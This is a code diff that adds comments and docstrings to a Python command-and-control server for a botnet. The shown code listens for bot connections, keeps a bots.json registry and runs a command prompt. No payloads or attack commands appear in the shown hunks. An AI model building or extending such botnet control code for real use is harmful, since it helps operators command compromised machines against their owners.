@@ -11,10 +11,11 @@ class CnC:
     """
 
     def __init__(self, host: str, port: int):
-        self.__address = (host, port)
-        self.__bots = {}
+        self.__address = (host, port)  # IP address and port of the CnC
+        self.__bots = {}  # connected bots
         self.__load_bots()
 
+        # available commands of the CnC
         self.__cmds = {
             'commands': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': 0},
             'help': {'fun': self.__help, 'desc': self.__help.__doc__, 'args': 1},
@@ -28,12 +29,16 @@ class CnC:
         }
         self.__lock = threading.Lock()  # lock for thread-safe access to attributes
 
+        # socket that listen for connect/disconnect bots
         self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__socket.bind(self.__address)
         self.__socket.listen(10)
         self.__socket.settimeout(3)
 
     def __load_bots(self):
+        """
+        Add bots whose IP addresses are stored in the bots json file. It checks if the bots are still online first.
+        """
         with open("bots.json", "r") as f:
             bots = json.load(f)
 
@@ -70,7 +75,13 @@ class CnC:
         return responses
 
     def __bot_connection(self, stop: threading.Event):
+        """
+        Thread that listen on the CnC socket bots connection. If a bot connects for the first time it saves the address
+        and the port in which it is listening to the connected bots. If a bots connect for the second time the function
+        removes it from the connected bots.
 
+        :param stop: threading event to stop listening on the socket
+        """
         while not stop.is_set():
             try:
                 client, address = self.__socket.accept()
@@ -250,7 +261,11 @@ class CnC:
         return "Closing program..."
 
     def cli(self):
+        """
+        Command line interface to interact with the Command and Control center of the botnet.
+        """
 
+        # start of the socket listening thread
         stop = threading.Event()
         bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
         bot_conn.start()
@@ -258,6 +273,7 @@ class CnC:
 
         cmd = 0
 
+        # command prompt
         while cmd != "exit":
             print("\n(type 'commands' to view the commands list).")
             cmd = str.lower(input("\n> "))
@@ -267,6 +283,10 @@ class CnC:
         stop.set()  # stop the socket thread
 
     def __run_cmd(self, line):
+        """
+        Interpret a given command and run the corresponding function with the given parameter.
+        :param line: command line
+        """
         try:
             if ' ' in line:  # if cmd has args
                 cmd, args = line.split(' ', 1)
